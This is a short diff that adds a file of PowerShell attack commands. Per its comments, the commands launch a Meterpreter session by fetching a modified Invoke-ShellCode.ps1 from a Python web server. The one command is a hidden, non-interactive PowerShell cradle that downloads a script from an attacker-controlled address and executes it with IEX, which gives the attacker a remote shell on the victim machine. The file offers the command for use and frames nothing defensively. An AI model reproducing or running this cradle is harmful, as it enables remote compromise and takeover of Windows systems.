@@ -1,0 +1,4 @@
+#These commands will invoke a powershell meterpreter
+#Note, you'll need to be servering the modified Invoke-ShellCode.ps1 renamed to 'b' and running the python simple web server on port 80
+
+powershell.exe -NoP -NonI -w HIDDEN -c IEX ((New-Object Net.WebClient).DownloadString('http://[IP Address]/b'))
